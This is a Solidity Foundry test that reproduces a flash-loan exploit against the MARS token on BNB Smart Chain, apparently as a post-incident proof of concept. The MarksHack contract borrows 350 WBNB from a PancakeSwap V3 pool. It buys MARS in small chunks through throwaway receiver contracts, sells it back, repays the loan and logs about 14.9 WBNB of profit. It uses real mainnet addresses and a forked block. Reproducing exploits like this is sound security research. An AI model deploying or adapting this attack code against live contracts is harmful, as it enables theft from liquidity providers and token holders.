// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IERC20.sol";

IPancakePairV3 constant pairPool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);
IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

contract TokenReceiver {
    constructor() payable {
        MARS.approve(msg.sender, type(uint256).max);
    }
}

contract MarksHack {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function exploit() public {
        pairPool.flash(address(this), 0, 350 ether, hex"0000");
    }

    function pancakeV3FlashCallback(
        uint256 /* fee0 */,
        uint256 fee1,
        bytes calldata /* data */
    ) external {
        require(msg.sender == address(pairPool), "not authorized");

        WBNB.approve(address(pancakeRouterV2), type(uint256).max - 1);
        MARS.approve(address(pancakeRouterV2), type(uint256).max - 1);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(MARS);

        for (uint i = 0; ; ) {
            i;
            if (WBNB.balanceOf(address(this)) == 0) {
                break;
            }
            uint tobuy = pancakeRouterV2.getAmountsIn(1000 ether, path)[0];
            TokenReceiver receiver = new TokenReceiver();
            if (WBNB.balanceOf(address(this)) > tobuy) {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        tobuy,
                        0,
                        path,
                        address(receiver),
                        block.timestamp + 1
                    );
                MARS.transferFrom(
                    address(receiver),
                    address(this),
                    MARS.balanceOf(address(receiver))
                );
            } else {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        WBNB.balanceOf(address(this)),
                        0,
                        path,
                        address(receiver),
                        block.timestamp + 1
                    );
                MARS.transferFrom(
                    address(receiver),
                    address(this),
                    MARS.balanceOf(address(receiver))
                );
                break;
            }
        }

        path[0] = address(MARS);
        path[1] = address(WBNB);

        for (uint i = 0; ; ) {
            i;
            if (MARS.balanceOf(address(this)) == 0) {
                break;
            }
            if (MARS.balanceOf(address(this)) > 1000 ether) {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        1000 ether,
                        0,
                        path,
                        address(this),
                        block.timestamp + 1
                    );
            } else {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        MARS.balanceOf(address(this)),
                        0,
                        path,
                        address(this),
                        block.timestamp + 1
                    );
                break;
            }
        }

        // repay the money
        WBNB.transfer(address(pairPool), 350 ether + fee1);

        console.log(WBNB.balanceOf(address(this))); // 14_917_247_169_204_703_006
        console.log(MARS.balanceOf(address(this))); // 0
    }

    receive() external payable {}
}

contract MarksTest is Test {
    MarksHack hacker;

    function setUp() public {
        vm.createSelectFork("bsc", 37_903_300 - 1);
    }

    function testExploit() public {
        hacker = new MarksHack{value: 12345}();
        hacker.exploit();
    }
}
